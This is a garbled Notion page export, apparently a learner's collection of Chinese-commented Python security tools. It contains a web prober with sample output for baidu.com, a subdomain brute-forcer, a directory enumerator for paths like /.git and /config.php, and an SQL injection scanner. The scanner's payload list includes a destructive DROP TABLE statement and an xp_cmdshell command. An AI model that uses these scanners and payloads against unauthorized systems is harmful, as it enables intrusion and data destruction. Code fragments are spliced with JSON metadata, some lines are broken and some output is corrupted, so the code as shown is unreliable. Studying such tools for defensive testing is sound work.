\"No Content - 请求成功，但服务器未返回内容。\",\n        301: \"Moved Permanently - 资源永久重定向到新的 URL。\",\n        302: \"Found - 资源临时重定向到新的 URL。\",\n        304: \"Not Modified - 缓存的资源未改变，返回未修改的副本。\",\n        400: \"Bad Request - 请求格式错误，服务器无法理解。\",\n        401: \"Unauthorized - 未授权，需要身份验证。\",\n        403: \"Forbidden - 服务器拒绝执行请求。\",\n        404: \"Not Found - 请求的资源不存在。\",\n        405: \"Method Not Allowed - 请求方法被禁止。\",\n        408: \"Request Timeout - 请求超时，服务器未收到完整请求。\",\n        500: \"Internal Server Error - 服务器发生未知错误。\",\n        502: \"Bad Gateway - 网关或代理服务器收到无效响应。\",\n        503: \"Service Unavailable - 服务器暂时不可用（过载或维护中）。\",\n        504: \"Gateway Timeout - 网关或代理超时。\",\n    }\n    return explanations.get(status_code, \"Unknown Status Code - 未知状态码。\")\n\n\ndef interpret_server_type(server):\n    \"\"\"\n    对服务器类型进行解释。\n    :param server: 服务器类型（响应头中的 Server 字段）\n    :return: 服务器类型的解释信息\n    \"\"\"\n    server_types = {\n        \"nginx\": \"Nginx - 一种高性能的开源 HTTP 和反向代理服务器，常用于负载均衡。\",\n        \"apache\": \"Apache - 世界上最流行的开源 Web 服务器，功能强大且灵活。\",\n        \"iis\": \"IIS - 微软开发的 Internet 信息服务，常用于运行 ASP.NET 应用程序。\",\n        \"cloudflare\": \"Cloudflare - 一种 CDN 和网络安全服务，通常用于增强网站性能和安全性。\",\n        \"gws\": \"Google Web Server - 谷歌使用的专属 Web 服务器，提供高性能服务。\",\n        \"litespeed\": \"LiteSpeed - 一种轻量级高性能 Web 服务器，专为速度优化。\",\n        \"openresty\": \"OpenResty - 基于 Nginx 的高性能 Web 平台，可扩展用于动态 Web 应用。\",\n        \"caddy\": \"Caddy - 一种自动化 HTTPS、高性能的 Web 服务器，适合开发者。\",\n        \"gunicorn\": \"Gunicorn - 一个基于 Python 的 WSGI HTTP 服务器，用于运行 Python Web 应用。\",\n    }\n    for key, explanation in server_types.items():\n        if key in server.lower():\n            return explanation\n    return \"Unknown - 无法确定的服务器类型。\"\n\n\ndef single_probe(url):\n    \"\"\"\n    针对单个 URL 的探测，并实时输出重点内容。\n    :param url: 单个目标 URL\n    :return: 探测结果字典\n    \"\"\"\n    try:\n        print(f\"\\n正在探测：{url}\")\n        status_code, headers, content = send_http_request(url)\n\n        # 提取信息\n        status_explanation = interpret_status_code(status_code)\n        server = headers.get(\"Server\", \"Unknown\")\n        server_explanation = interpret_server_type(server)\n        content_analysis = analyze_content(content)\n\n        # 获取 SSL 信息（如果是 HTTPS）\n        ssl_info = fetch_ssl_certificate_info(url) if url.startswith(\"https://\") else {}\n\n        # 实时输出重点内容\n        print(f\"状态码：{status_code} - {status_explanation}\")\n        print(f\"服务器类型：{server} - {server_explanation}\")\n        print(f\"页面内容分析：{content_analysis}\")\n        if ssl_info:\n            print(\"SSL/TLS 证书信息：\")\n            for key, value in ssl_info.items():\n                print(f\"  {key}: {value}\")\n\n        # 返回结果\n        return {\n            \"URL\": url,\n            \"Status Code\": status_code,\n            \"Status Explanation\": status_explanation,\n            \"Server\": server,\n            \"Server Explanation\": server_explanation,\n            \"Content Analysis\": content_analysis,\n            \"SSL Info\": ssl_info,\n        }\n    except ValueError as ve:\n        print(f\"错误：{ve}\")\n        return {\"URL\": url, \"Error\": str(ve)}\n    except Exception as e:\n        print(f\"未知错误：{e}\")\n        return {\"URL\": url, \"Error\": str(e)}\n\n\ndef batch_probe(urls):\n    \"\"\"\n    批量探测多个 URL，并实时输出重点内容。\n    :param urls: URL 列表\n    :return: 每个 URL 的探测结果（列表）\n    \"\"\"\n    results = []\n    for url in urls:\n        result = single_probe(url)\n        results.append(result)\n    return results\n\n\ndef save_results(results, filename=\"web_probe_results.json\"):\n    \"\"\"\n    将探测结果保存为 JSON 文件。\n    :param results: 探测结果\n    :param filename: 文件名\n    \"\"\"\n    try:\n        with open(filename, \"w\") as f:\n            json.dump(results, f, indent=4, ensure_ascii=False)\n        print(f\"探测结果已保存到文件：{filename}\")\n    except Exception as e:\n        print(f\"保存结果时发生错误：{e}\")\n\n\ndef load_urls_from_file(filename):\n    \"\"\"\n    从文件中加载 URL 列表。\n    :param filename: 文件名\n    :return: URL 列表\n    \"\"\"\n    try:\n        with open(filename, \"r\") as f:\n            urls = [line.strip() for line in f if line.strip()]\n        if not urls:\n            raise ValueError(\"文件中没有有效的 URL！\")\n        return urls\n    except FileNotFoundError:\n        print(f\"错误：文件 {filename} 不存在！\")\n        return []\n    except Exception as e:\n        print(f\"加载文件时发生错误：{e}\")\n        return []\n\n\ndef main():\n    \"\"\"\n    主函数：用户交互入口，支持单个 URL 探测和批量 URL 探测。\n    \"\"\"\n    print(\"=== Web 服务探测工具 🌐🛠 ===\")\n    mode = input(\"请选择模式（1: 单个 URL 探测，2: 批量 URL 探测）： \").strip()\n\n    if mode == \"1\":\n        # 单个 URL 探测\n        url = input(\"请输入目标 URL（例如 https://example.com）： \").strip()\n        if not validate_url(url):\n            print(\"错误：输入的 URL 无效，请输入有效的 URL！\")\n            return\n        single_probe(url)\n    elif mode == \"2\":\n        # 批量 URL 探测\n        filename = input(\"请输入包含 URL 列表的文件名： \").strip()\n        urls = load_urls_from_file(filename)\n        if not urls:\n            return\n\n        print(f\"\\n共加载 {len(urls)} 个 URL，正在探测中...\\n\")\n        results = batch_probe(urls)\n        save_results(results)\n    else:\n        print(\"错误：无效的模式选择！\")\n\n\nif __name__ == \"__main__\":\n    main()"},{"t":"e"}],"l":""},"c":[]}}}}},"role":"reader"},"14d99968-1bdb-800b-8335-fca203f4323d":{"value":{"id":"14d99968-1bdb-800b-8335-fca203f4323d","version":150,"type":"code","properties":{"title":[["#实例网址文件\nhttps://www.baidu.com\n\n\n#测试返回数据\n[\n    {\n        \"URL\": \"https://www.baidu.com\",\n        \"Status Code\": 200,\n        \"Status Explanation\": \"OK - ����ɹ����������������������Դ��\",\n        \"Server\": \"BWS/1.1\",\n        \"Server Explanation\": \"Unknown - �޷�ȷ���ķ��������͡�\",\n        \"Content Analysis\": \"Login Page - ҳ�������¼������\",\n        \"SSL Info\": {\n            \"Issuer\": {\n                \"countryName\": \"BE\",\n                \"organizationName\": \"GlobalSign nv-sa\",\n                \"commonName\": \"GlobalSign RSA OV SSL CA 2018\"\n            },\n            \"Subject\": {\n                \"countryName\": \"CN\",\n                \"stateOrProvinceName\": \"beijing\",\n                \"localityName\": \"beijing\",\n                \"organizationName\": \"Beijing Baidu Netcom Science Technology Co., Ltd\",\n                \"commonName\": \"baidu.com\"\n            },\n            \"Valid From\": \"Jul  8 01:41:02 2024 GMT\",\n            \"Valid Until\": \"Aug  9 01:41:01 2025 GMT\",\n            \"Serial Number\": \"4E4003A65EB681F87F4BD8EB\",\n            \"Version\": 3\n        }\n    }"]],"language":[["Plain Text"]]},"created_time":1732842916606,"last_edited_time futures import ThreadPoolExecutor, as_completed\nimport os\n\ndef dns_lookup(subdomain):\n    try:\n        # 执行 A 记录查询\n        socket.gethostbyname(subdomain)\n        return True\n    except socket.gaierror:\n        # 域名没有 IP 地址或者该记录不是 A 记录\n        return False\n\ndef generate_subdomains(target_domain, wordlist):\n    with open(wordlist, 'r', encoding='utf-8') as file:\n        for line in file.readlines():\n            yield '{}.{}'.format(line.strip(), target_domain)\n\ndef generate_common_subdomains(target_domain):\n    common_prefixes = [\n        \"www\", \"mail\", \"admin\", \"test\", \"dev\", \"staging\",\n        \"ftp\", \"blog\", \"api\", \"support\", \"forum\", \"shop\"\n    ]\n    for prefix in common_prefixes:\n        yield '{}.{}'.format(prefix, target_domain)\n\ndef main():\n    # 用户输入目标域名\n    target_domain = input(\"请输入要扫描的目标域名（例如 example.com）：\").strip()\n    \n    if not target_domain:\n        print(\"未输入有效的域名。\")\n        return\n    \n    # 生成子域名列表\n    subdomains = set()\n    \n    # 使用预定义的常见子域前缀\n    subdomains.update(generate_common_subdomains(target_domain))\n    \n    # 如果存在自定义字典文件，则添加这些子域\n    wordlist_path = 'wordlist.txt'\n    if os.path.exists(wordlist_path):\n        print(f\"使用自定义字典文件 {wordlist_path} 生成更多子域名。\")\n        subdomains.update(generate_subdomains(target_domain, wordlist_path))\n    else:\n        print(\"未找到自定义字典文件，仅使用预定义的常见子域前缀。\")\n    \n    # 进行 DNS 查询\n    with ThreadPoolExecutor(max_workers=100) as executor:\n        futures = {executor.submit(dns_lookup, subdomain): subdomain for subdomain in subdomains}\n        \n        for future in as_completed(futures):\n            subdomain = futures[future]\n            try:\n                if future.result():\n                    print('[+] {} 存在'.format(subdomain))\n                else:\n                    print('[-] {} 不存在'.format(subdomain))\n            except Exception as e:\n                print('[-] 查询 {} 时发生错误: {}'.format(subdomain, e))\n\nif __name__ == )\")\n            elif status_code == 403:\n                print(f\"[!] Forbidden: {full_url} (Status Code: {status_code})\")\n            elif status_code == 401:\n                print(f\"[!] Unauthorized: {full_url} (Status Code: {status_code})\")\n            elif status_code == 404:\n                pass  # 静默忽略404状态码，表示资源不存在\n            else:\n                print(f\"[-] Other: {full_url} (Status Code: {status_code})\")\n        except requests.RequestException as e:\n            print(f\"[-] Error accessing {full_url}: {e}\")\n\nif __name__ == \"__main__\":\n    # 使用默认路径字典进行扫描\n    enum_files_and_dirs(target_url, default_paths_to_test)\n    \n    # 如果需要使用自定义路径字典，可以传递一个列表给custom_dict参数\n    custom_paths = [\n        \"/secret\",\n        \"/hidden\",\n        \"/.git\",\n        # 添加更多自定义路径\n    ]\n    enum_files_and_dirs(target_url, default_paths_to_test, custom_dict=custom_paths)"]],"language":[["Python"]]},"created_time":1733230517459,"last_edited_time":1733230538647,"parent_id":"14a99968-1bdb-80ba-b3cb-eab23bfe6b1a","parent_table":"block","alive":true,"space_id":"dcfc0b10-f3f6-4bfe-a7f8-895b46badeca","crdt_format_version":1,"crdt_data":{"title":{"r":"KeKAQw2TSgIZtFlwoEy9LQ,\"start\",\"end\"","n":{"KeKAQw2TSgIZtFlwoEy9LQ,\"start\",\"end\"":{"s":{"x":"KeKAQw2TSgIZtFlwoEy9LQ","i":[{"t":"s"},{"t":"t","i":["8j2Z8bhIm9-H",1],"o":"start","l":1451,"c":"import requests\n\n# 定义目标URL和默认路径字典\ntarget_url = \"http://example.com\"\ndefault_paths_to_test = [\n    \"/admin\",\n    \"/backup.zip\",\n    \"/.htaccess\",\n    \"/config.php\",\n    \"/robots.txt\",\n    # 添加更多可能的路径\n]\n\ndef enum_files_and_dirs(base_url, paths, custom_dict=None):\n    if custom_dict:\n        paths += custom_dict\n\n    for path in paths:\n        full_url = f\"{base_url}{path}\"\n        try:\n            response = requests.get(full_url)\n            status_code = response.status_code\n            if status_code == 200:\n                print(f\"[+] Found: {full_url} (Status Code: {status_code})\")\n            elif status_code == 403:\n                print(f\"[!] Forbidden: {full_url} (Status Code: {status_code})\")\n            elif status_code == 401:\n                print(f\"[!] Unauthorized: {full_url} (Status Code: {status_code})\")\n            elif status_code == 404:\n                pass  # 静默忽略404状态码，表示资源不存在\n            else:\n                print(f\"[-] Other: {full_url} (Status Code: {status_code})\")\n        except requests.RequestException as e:\n            print(f\"[-] Error accessing {full_url}: {e}\")\n\nif __name__ == \"__main__\":\n    # 使用默认路径字典进行扫描\n    enum_files_and_dirs(target_url, default_paths_to_test)\n    \n    # 如果需要使用自定义路径字典，可以传递一个列表给custom_dict参数\n    custom_paths = [\n        \"/secret\",\n        \"/hidden\",\n        \"/.git\",\n        # 添加更多自定义路径\n    ]\n    enum_files_and_dirs(target_url, default_paths_to_test, custom_dict=custom_paths)"},{"t":"e"}],"l":""},"c":[]}}}}},"role":"reader"},"15199968-1bdb-80d1-9a47-dd1811d537f5":{"value":{"id":"15199968-1bdb-80d1-9a47-dd1811d537f5","version":137,"type":"image","properties":{"size":[["39.3KB"]],"title":[["image.png"]],"source":[["https://prod-files-secure.s3.us-west-2.amazonaws.com/dcfc0b10-f3f6-4bfe-a7f8-895b46badeca/173fcbc4-245a-47c3-add5-9518fec55a71/image.png"]],"caption":[["不能突破网站的防恶意检测，有误报。"]]},"format":{"block_width":1178.0804443359375,"display_source":"https://prod-files-secure.s3.us-west-2.amazonaws.com/dcfc0b10-f3f6-4bfe-a7f8-895b46badeca/173fcbc4-245a-47c3-add5-9518fec55a71/image.png","block_full_width":false,"block_page_width":true,"block_aspect_ratio":0.245593419506463,"block_preserve_scale":true},"created_time":1733230965159,"last_edited_time":1733231002033,"parent_id":"14a99968-1bdb-80ba-b3cb-eab23bfe6b1a","parent_table":"block","alive":true,"file_ids":["173fcbc4-245a-47c3-add5-9518fec55a71"],"space_id":"dcfc0b10-f3f6-4bfe-a7f8-895b46badeca","crdt_format_version":1,"crdt_data":{"title":{"r":"v45qqvh5H4MFST1hB0kCHg,\"start\",\"end\"","n":{"v45qqvh ,"role":"reader"},"14a99968-1bdb-8076-8d11-e3ecde7e88ea":{"value":{"id":"14a99968-1bdb-8076-8d11-e3ecde7e88ea","version":10,"type":"bulleted_list","properties":{"title":[["检测返回页面是否包含数据库错误信息或异常。"]]},"created_time":1732625032837,"last_edited_time":1733965160840,"parent_id":"14a99968-1bdb-80ba-b3cb-eab23bfe6b1a","parent_table":"block","alive":true,"space_id":"dcfc0b10-f3f6-4bfe-a7f8-895b46badeca","crdt_format_version":1,"crdt_data":{"title":{"r":"r_vuhzF1ZAmJt_KhINfWhg,\"start\",\"end\"","n":{"r_vuhzF1ZAmJt_KhINfWhg,\"start\",\"end\"":{"s":{"x":"r_vuhzF1ZAmJt_KhINfWhg","i":[{"t":"s"},{"t":"t","i":["mpedwRD3xn7t",1],"o":"start","l":21,"c":"检测返回页面是否包含数据库错误信息或异常。"},{"t":"e"}],"l":""},"c":[]}}}}},"role":"reader"},"15a99968-1bdb-80b9-a676-c31b0db20665":{"value":{"id":"15a99968-1bdb-80b9-a676-c31b0db20665","version":189,"type":"code","properties":{"title":[["#SQL注入检测工具\nimport requests\nimport re\nfrom urllib.parse import urljoin, quote\nimport time\nimport json\nfrom typing import Dict, List, Tuple\nfrom dataclasses import dataclass\nfrom enum import Enum\n\nclass VulnType(Enum):\n    ERROR_BASED = \"错误注入\"\n    UNION_BASED = \"联合查询注入\"\n    BOOLEAN_BASED = \"布尔注入\"\n    TIME_BASED = \"时间盲注\"\n    STACK_QUERY = \"堆叠查询注入\"\n    BLIND = \"盲注\"\n\n@dataclass\nclass VulnResult:\n    type: VulnType\n    parameter: str\n    payload: str\n    description: str\n    poc: str\n    risk_level: str\n    details: Dict\n    recommendations: List[str]\n\nclass SQLInjectionScanner:\n    def __init__(self):\n        self._load_payloads()\n        self._load_patterns()\n        self.headers = {\n            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'\n        }\n        self.timeout = 10\n        self.delay = 0.5\n\n    def _load_payloads(self):\n        # 分类存储不同类型的payload\n        self.payloads = {\n            VulnType.ERROR_BASED: [\n                \"'''\", \n                \"'))\", \n                \"\\\"\\\"\\\"\",\n                \"%%\",\n                \"--\", \n                \"#\",\n                \"/*!12345SELECT*/\",\n            ],\n            VulnType.UNION_BASED: [\n                \" UNION ALL SELECT NULL--\",\n                \" UNION ALL SELECT NULL,NULL--\",\n                \" UNION ALL SELECT NULL,NULL,NULL--\",\n                \") UNION SELECT NULL,NULL,NULL--\",\n                \"' UNION SELECT version(),user(),database()--\",\n            ],\n            VulnType.BOOLEAN_BASED: [\n                \"' AND '1'='1\",\n                \"' AND '1'='2\",\n                \"' OR '1'='1\",\n                \"1' AND sleep(0)='0\",\n                \"1' AND 1=1--\",\n            ],\n            VulnType.TIME_BASED: [\n                \"'; WAITFOR DELAY '0:0:5'--\",\n                \"'); WAITFOR DELAY '0:0:5'--\",\n                \"' OR sleep(5)--\",\n                \"' AND sleep(5)--\",\n                \"BENCHMARK(5000000,MD5(1))\",\n            ],\n            VulnType.STACK_QUERY: [\n                \"; DROP TABLE temp--\",\n                \"; SELECT @@version--\",\n                \"; EXEC xp_cmdshell 'ping 127.0.0.1'--\",\n            ]\n        }\n\n    def _load_patterns(self):\n        self.error_patterns = {\n            'mysql': [\n                r\"SQL syntax.*?MySQL\",\n                r\"Warning.*?\\Wmysqli?_\",\n                r\"MySQLSyntaxErrorException\",\n                r\"valid MySQL result\",\n                r\"check the manual that (corresponds to|fits) your MySQL server version\",\n            ],\n            'postgresql': [\n                r\"PostgreSQL.*?ERROR\",\n                r\"Warning.*?\\Wpg_\",\n                r\"valid PostgreSQL result\",\n                r\"Npgsql\\.\",\n            ],\n            'mssql': [\n                r\"Driver.*? SQL[\\-\\_\\ ]*Server\",\n                r\"OLE DB.*? SQL Server\",\n                r\"\\bSQL Server[^\u0026lt;\u0026quot;]+Driver\",\n                r\"Warning.*?\\W(mssql|sqlsrv)_\",\n                r\"\\bSQL Server[^\u0026lt;\u0026quot;]+[0-9a-fA-F]{8}\",\n            ],\n            'oracle': [\n                r\"\\bORA-[0-9][0-9][0-9][0-9]\",\n                r\"Oracle error\",\n                r\"Oracle.*?Driver\",\n                r\"Warning.*?\\W(oci|ora)_\",\n            ],\n            'sqlite': [\n                r\"SQLite/JDBCDriver\",\n                r\"SQLite\\.Exception\",\n                r\"System\\.Data\\.SQLite\\.SQLiteException\",\n                r\"Warning.*?\\Wsqlite_\",\n            ]\n        }\n\n    def scan_url(self, url: str) -\u003e List[VulnResult]:\n        print(f\"\\n[*] 开始扫描: {url}\")\n        results = []\n        \n        try:\n            # 基础信息收集\n            base_response = self._send_request(url)\n            base_length = len(base_response.text) if base_response else 0\n            \n            # 获取参数列表\n            params = self._get_parameters(url)\n            if not params:\n                params = ['id', 'page', 'user', 'username', 'search']\n            \n            # 测试每个参数\n            for param in params:\n                param_results = self._test_parameter(url, param, base_length)\n                results.extend(param_results)\n                \n        except Exception as e:\n            print(f\"[!] 扫描过程中出错: {str(e)}\")\n            \n        return self._analyze_results(results)\n\n    def _test_parameter(self, url: str, param: str, base_length: int) -\u003e List[VulnResult]:\n        results = []\n        print(f\"[+] 测试参数: {param}\")\n\n        for vuln_type, payloads in self.payloads.items():\n            for payload in payloads:\n                try:\n                    test_url = self._inject_payload(url, param, payload)\n                    start_time = time.time()\n                    response = self._send_request(test_url)\n                    response_time = time.time() - start_time\n                    \n                    if not response:\n                        continue\n\n                    result = self._check_vulnerability(\n                        vuln_type,\n                        param,\n                        payload,\n                        response,\n                        base_length,\n                        response_time\n                    )\n                    \n                    if result:\n                        results.append(result)\n                        \n                except Exception as e:\n                    print(f\"[!] 测试payload时出错: {str(e)}\")\n                    continue\n                \n                time.sleep(self.delay)\n        \n        return results\n\n    def _check_vulnerability(\n        self, \n        vuln_type: VulnType,\n        param: str,\n        payload: str,\n        response,\n        base_length: int,\n        response_time: float\n    ) -\u003e VulnResult:\n        \n        # 检测基于错误的注入\n        if vuln_type == VulnType.ERROR_BASED:\n            for dbms, patterns in self.error_patterns.items():\n                for pattern in patterns:\n                    if re.search(pattern, response.text, re.I):\n                        return VulnResult(\n                            type=vuln_type,\n                            parameter=param,\n                            payload=payload,\n                            description=f\"发现{dbms}数据库错误信息泄露\",\n                            poc=f\"{param}={payload}\",\n                            risk_level=\"高\",\n                            details={\n                                \"数据库类型\": dbms,\n                                \"错误信息\": re.search(pattern, response.text, re.I).group(0)\n                            },\n                            recommendations=[\n                                \"1. 关闭生产环境的错误显示\",\n                                \"2. 使用参数化查询\",\n                                \"3. 实施输入验证和转义\"\n                            ]\n                        )\n\n        # 检测基于时间的注入\n        if vuln_type == VulnType.TIME_BASED and response_time \u003e 5:\n            return VulnResult(\n                type=vuln_type,\n                parameter=param,\n                payload=payload,\n                description=\"发现基于时间的SQL注入漏洞\",\n                poc=f\"{param}={payload}\",\n                risk_level=\"中\",\n                details={\n                    \"响应时间\": f\"{response_time:.2f}秒\"\n                },\n                recommendations=[\n                    \"1. 使用参数化查询\",\n                    \"2. 限制SQL语句执行时间\",\n                    \"3. 实施WAF防护\"\n                ]\n            )\n\n        # 检测基于联合查询的注入\n        if vuln_type == VulnType.UNION_BASED:\n            if len(response.text) \u003e base_length * 2 or 'UNION' in response.text:\n                return VulnResult(\n                    type=vuln_type,\n                    parameter=param,\n                    payload=payload,\n                    description=\"发现基于UNION的SQL注入漏洞\",\n                    poc=f\"{param}={payload}\",\n                    risk_level=\"高\",\n                    details={\n                        \"响应长度\": len(response.text),\n                        \"基准长度\": base_length\n                    },\n                    recommendations=[\n                        \"1. 使用ORM或参数化查询\",\n                        \"2. 实施输入验证\",\n                        \"3. 最小权限原则配置数据库账号\"\n                    ]\n                )\n\n        # 检测布尔注入\n        if vuln_type == VulnType.BOOLEAN_BASED:\n            true_payload = payload.replace(\"'1'='2\", \"'1'='1\")\n            false_payload = payload.replace(\"'1'='1\", \"'1'='2\")\n            \n            true_response = self._send_request(self._inject_payload(response.url, param, true_payload))\n            false_response = self._send_request(self._inject_payload(response.url, param, false_payload))\n            \n            if true_response and false_response and \\\n               abs(len(true_response.text) - len(false_response.text)) \u003e 100:\n                return VulnResult(\n                    type=vuln_type,\n                    parameter=param,\n                    payload=payload,\n                    description=\"发现基于布尔的SQL注入漏洞\",\n                    poc=f\"{param}={payload}\",\n                    risk_level=\"中\",\n                    details={\n                        \"TRUE响应长度\": len(true_response.text),\n                        \"FALSE响应长度\": len(false_response.text)\n                    },\n                    recommendations=[\n                        \"1. 使用参数化查询\",\n                        \"2. 实施输入验证\",\n                        \"3. 统一错误响应\"\n                    ]\n                )\n\n        return None\n\n    def _send_request(self, url: str) -\u003e requests.Response:\n        try:\n            return requests.get(\n                url,\n                headers=self.headers,\n                timeout=self.timeout,\n                verify=False\n            )\n        except:\n            return None\n\n    def _get_parameters(self, url: str) -\u003e List[str]:\n        params = []\n        if '?' in url:\n            query = url.split('?')[1]\n            for param in query.split('\u0026'):\n                if '=' in param:\n                    params.append(param.split('=')[0])\n        return params\n\n    def _inject_payload(self, url: str, param: str, payload: str) -\u003e str:\n        encoded_payload = quote(payload)\n        if '?' not in url:\n            return f\"{url}?{param}={encoded_payload}\"\n        \n        base_url = url.split('?')[0]\n        query = url.split('?')[1]\n        new_params = []\n        param_found = False\n        \n        for p in query.split('\u0026'):\n            if p.startswith(f\"{param}=\"):\n                new_params.append(f\"{param}={encoded_payload}\")\n                param_found = True\n            else:\n                new_params.append(p)\n        \n        if not param_found:\n            new_params.append(f\"{param}={encoded_payload}\")\n        \n        return f\"{base_url}?{'\u0026'.join(new_params)}\"\n\n    def _analyze_results(self, results: List[VulnResult]) -\u003e List[VulnResult]:\n        # 去重和结果分析\n        unique_results = {}\n        for result in results:\n            key = f\"{result.type}_{result.parameter}\"\n            if key not in unique_results:\n                unique_results[key] = result\n            \n        return list(unique_results.values())\n\ndef main():\n    scanner = SQLInjectionScanner()\n    url = input(\"请输入要扫描的URL: \")\n    \n    if not url.startswith(('http://', 'https://')):\n        url = 'http://' + url\n    \n    results = scanner.scan_url(url)\n    \n    if results:\n        print(\"\\n[!] 扫描报告\")\n        print(\"=\" * 50)\n        \n        for i, result in enumerate(results, 1):\n            print(f\"\\n漏洞 #{i}\")\n            print(f\"类型: {result.type.value}\")\n            print(f\"参数: {result.parameter}\")\n            print(f\"描述: {result.description}\")\n            print(f\"风险等级: {result.risk_level}\")\n            print(f\"POC: {result.poc}\")\n            print(\"\\n详细信息:\")\n            for k, v in result.details.items():\n                print(f\"  {k}: {v}\")\n            print(\"\\n修复建议:\")\n            for rec in result.recommendations:\n                print(f\"  {rec}\")\n            print(\"-\" * 50)\n    else:\n        print(\"\\n[+] 未发现明显的SQL注入漏洞\")\n\nif __name__ == \"__main__\":\n    main()\n    "]],"language":[["Python"]]},"created_time":1733965152511,"last_edited_time":1733974475877,"parent_id":"14a99968-1bdb-80ba-b3cb-eab23bfe6b1a","parent_table":"block","alive":true,"space_id":"dcfc0b10-f3f6-4bfe-a7f8-895b46badeca","crdt_format_version":1,"crdt_data":{"title":{"r":"6qkOAHoWJRxmcC6eTCtepw,\"start\",\"end\"","n":{"6qkOAHoWJRxmcC6eTCtepw,\"start\",\"end\"":{"s":{"x":"6qkOAHoWJRxmcC6eTCtepw","i":[{"t":"s"},{"t":"t","i":["HQzq9CT1gjtg",1],"o":"start","l":11861,"c":"#SQL注入检测工具\nimport requests\nimport re\nfrom urllib.parse import urljoin, quote\nimport time\nimport json\nfrom typing import Dict, List, Tuple\nfrom dataclasses import dataclass\nfrom enum import Enum\n\nclass VulnType(Enum):\n    ERROR_BASED = \"错误注入\"\n    UNION_BASED = \"联合查询注入\"\n    BOOLEAN_BASED = \"布尔注入\"\n    TIME_BASED = \"时间盲注\"\n    STACK_QUERY = \"堆叠查询注入\"\n    BLIND = \"盲注\"\n\n@dataclass\nclass VulnResult:\n    type: VulnType\n    parameter: str\n    payload: str\n    description: str\n    poc: str\n    risk_level: str\n    details: Dict\n    recommendations: List[str]\n\nclass SQLInjectionScanner:\n    def __init__(self):\n        self._load_payloads()\n        self._load_patterns()\n        self.headers = {\n            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'\n        }\n        self.timeout = 10\n        self.delay = 0.5\n\n    def _load_payloads(self):\n        # 分类存储不同类型的payload\n        self.payloads = {\n            VulnType.ERROR_BASED: [\n                \"'''\", \n                \"'))\", \n                \"\\\"\\\"\\\"\",\n                \"%%\",\n                \"--\", \n                \"#\",\n                \"/*!12345SELECT*/\",\n            ],\n            VulnType.UNION_BASED: [\n                \" UNION ALL SELECT NULL--\",\n                \" UNION ALL SELECT NULL,NULL--\",\n                \" UNION ALL SELECT NULL,NULL,NULL--\",\n                \") UNION SELECT NULL,NULL,NULL--\",\n                \"' UNION SELECT version(),user(),database()--\",\n            ],\n            VulnType.BOOLEAN_BASED: [\n                \"' AND '1'='1\",\n                \"' AND '1'='2\",\n                \"' OR '1'='1\",\n                \"1' AND sleep(0)='0\",\n                \"1' AND 1=1--\",\n            ],\n            VulnType.TIME_BASED: [\n                \"'; WAITFOR DELAY '0:0:5'--\",\n                \"'); WAITFOR DELAY '0:0:5'--\",\n                \"' OR sleep(5)--\",\n                \"' AND sleep(5)--\",\n                \"BENCHMARK(5000000,MD5(1))\",\n            ],\n            VulnType.STACK_QUERY: [\n                \"; DROP TABLE temp--\",\n                \"; SELECT @@version--\",\n                \"; EXEC xp_cmdshell 'ping 127.0.0.1'--\",\n            ]\n        }\n\n    def _load_patterns(self):\n        self.error_patterns = {\n            'mysql': [\n                r\"SQL syntax.*?MySQL\",\n                r\"Warning.*?\\Wmysqli?_\",\n                r\"MySQLSyntaxErrorException\",\n                r\"valid MySQL result\",\n                r\"check the manual that (corresponds to|fits) your MySQL server version\",\n            ],\n            'postgresql': [\n                r\"PostgreSQL.*?ERROR\",\n                r\"Warning.*?\\Wpg_\",\n                r\"valid PostgreSQL result\",\n                r\"Npgsql\\.\",\n            ],\n            'mssql': [\n                r\"Driver.*? SQL[\\-\\_\\ ]*Server\",\n                r\"OLE DB.*? SQL Server\",\n                r\"\\bSQL Server[^\u0026lt;\u0026quot;]+Driver\",\n                r\"Warning.*?\\W(mssql|sqlsrv)_\",\n                r\"\\bSQL Server[^\u0026lt;\u0026quot;]+[0-9a-fA-F]{8}\",\n            ],\n            'oracle': [\n                r\"\\bORA-[0-9][0-9][0-9][0-9]\",\n                r\"Oracle error\",\n                r\"Oracle.*?Driver\",\n                r\"Warning.*?\\W(oci|ora)_\",\n            ],\n            'sqlite': [\n                r\"SQLite/JDBCDriver\",\n                r\"SQLite\\.Exception\",\n                r\"System\\.Data\\.SQLite\\.SQLiteException\",\n                r\"Warning.*?\\Wsqlite_\",\n            ]\n        }\n\n    def scan_url(self, url: str) -\u003e List[VulnResult]:\n        print(f\"\\n[*] 开始扫描: {url}\")\n        results = []\n        \n        try:\n            # 基础信息收集\n            base_response = self._send_request(url)\n            base_length = len(base_response.text) if base_response else 0\n            \n            # 获取参数列表\n            params = self._get_parameters(url)\n            if not params:\n                params = ['id', 'page', 'user', 'username', 'search']\n            \n            # 测试每个参数\n            for param in params:\n                param_results = self._test_parameter(url, param, base_length)\n                results.extend(param_results)\n                \n        except Exception as e:\n            print(f\"[!] 扫描过程中出错: {str(e)}\")\n            \n        return self._analyze_results(results)\n\n    def _test_parameter(self, url: str, param: str, base_length: int) -\u003e List[VulnResult]:\n        results = []\n        print(f\"[+] 测试参数: {param}\")\n\n        for vuln_type, payloads in self.payloads.items():\n            for payload in payloads:\n                try:\n                    test_url = self._inject_payload(url, param, payload)\n                    start_time = time.time()\n                    response = self._send_request(test_url)\n                    response_time = time.time() - start_time\n                    \n                    if not response:\n                        continue\n\n                    result = self._check_vulnerability(\n                        vuln_type,\n                        param,\n                        payload,\n                        response,\n                        base_length,\n                        response_time\n                    )\n                    \n                    if result:\n                        results.append(result)\n                        \n                except Exception as e:\n                    print(f\"[!] 测试payload时出错: {str(e)}\")\n                    continue\n                \n                time.sleep(self.delay)\n        \n        return results\n\n    def _check_vulnerability(\n        self, \n        vuln_type: VulnType,\n        param: str,\n        payload: str,\n        response,\n        base_length: int,\n        response_time: float\n    ) -\u003e VulnResult:\n        \n        # 检测基于错误的注入\n        if vuln_type == VulnType.ERROR_BASED:\n            for dbms, patterns in se n None\n\n    def _get_parameters(self, url: str) -\u003e List[str]:\n        params = []\n        if '?' in url:\n            query = url.split('?')[1]\n            for param in query.split('\u0026'):\n                if '=' in param:\n                    params.append(param.split('=')[0])\n        return params\n\n    def _inject_payload(self, url: str, param: str, payload: str) -\u003e str:\n        encoded_payload = quote(payload)\n        if '?' not in url:\n            return f\"{url}?{param}={encoded_payload}\"\n        \n        base_url = url.split('?')[0]\n        query = url.split('?')[1]\n        new_params = []\n        param_found = False\n        